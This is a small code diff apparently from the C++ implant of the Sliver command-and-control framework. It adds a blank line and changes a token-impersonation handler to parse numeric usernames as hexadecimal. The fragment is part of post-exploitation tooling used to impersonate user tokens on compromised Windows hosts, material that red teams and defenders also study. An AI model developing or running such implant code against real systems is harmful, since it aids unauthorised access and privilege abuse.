@@ -131,6 +131,7 @@ namespace handlers {
 		resp.set_path(filesystem::absolute(req.path()).string());
 		return wrapResponse(taskID, resp);
 	}
+
 	sliverpb::Envelope downloadHandler(int64_t taskID, string data) {
 		sliverpb::DownloadReq req;
 		sliverpb::Download resp;
@@ -287,7 +288,7 @@ namespace handlers {
 		bool res = FALSE;
 		try {
 			if (utils::is_number(req.username()))
-				res = token::Impersonate(stoi(req.username()));
+				res = token::Impersonate(stoll(req.username(),nullptr,16));
 			else
 				res = token::Impersonate(req.username());
 			if (res == false) {
